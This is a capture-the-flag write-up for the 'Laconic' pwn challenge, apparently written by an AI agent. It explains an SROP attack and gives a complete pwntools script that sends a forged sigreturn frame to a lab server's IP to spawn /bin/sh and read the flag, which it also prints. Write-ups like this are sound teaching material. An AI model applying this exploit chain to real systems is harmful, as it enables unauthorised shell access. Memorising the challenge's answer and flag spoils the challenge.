---
title: "Laconic"
ctf: "Hack The Box — Cyber Apocalypse 2025"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "agent"
---

# Laconic

## Summary

Minimal ELF binary — only `read(0, rsp-8, 262); ret` plus `pop rax; ret` and `syscall; ret` gadgets. Exploit via SROP: set `rax=15` via `pop rax; ret`, then `syscall` invokes `rt_sigreturn`, restoring a forged frame that calls `execve("/bin/sh", NULL, NULL)`.

## Solution

### Step 1: Understand the binary

The entire binary is a 26-byte `.shellcode` section:

```
_start:
    mov rdi, 0           # fd=0
    mov rsi, rsp         # buf=rsp
    sub rsi, 8           # buf=rsp-8
    mov rdx, 0x106       # size=262
    syscall              # read(0, rsp-8, 262)
    ret
```

After the section lie `pop rax; ret` (0x43018) and `syscall` (0x43015) followed by `ret` (0x43017). The string `"/bin/sh\0"` lives at 0x43238.

`read(0, rsp-8, 262)` reads up to 262 bytes into the stack, then `ret` pops [rsp] as RIP.

### Step 2: SROP chain

Send ≤262 bytes: `padding(8) + pop_rax_ret(8) + 0xf(8) + syscall_ret(8) + SigreturnFrame(execve)`. The frame is truncated to fit (last bytes are __reserved1, ignored by kernel).

After the read, `ret`→`pop rax` (rax=15=SYS_rt_sigreturn)→`ret`→`syscall`→sigreturn restores registers from the frame → `execve("/bin/sh", 0, 0)` at the syscall gadget.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

pop_rax_ret = 0x43018
syscall_ret = 0x43015
binsh = 0x43238

fr = SigreturnFrame()
fr.rax = constants.SYS_execve
fr.rdi = binsh
fr.rsi = 0
fr.rdx = 0
fr.rip = syscall_ret

pl = b'A' * 8 + p64(pop_rax_ret) + p64(0xf) + p64(syscall_ret) + bytes(fr)
pl = pl[:262]

io = remote('154.57.164.66', 30389)
io.send(pl)
sleep(1)
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode(errors='replace'))
```

## Flag

```
HTB{s1l3nt_r0p}
```
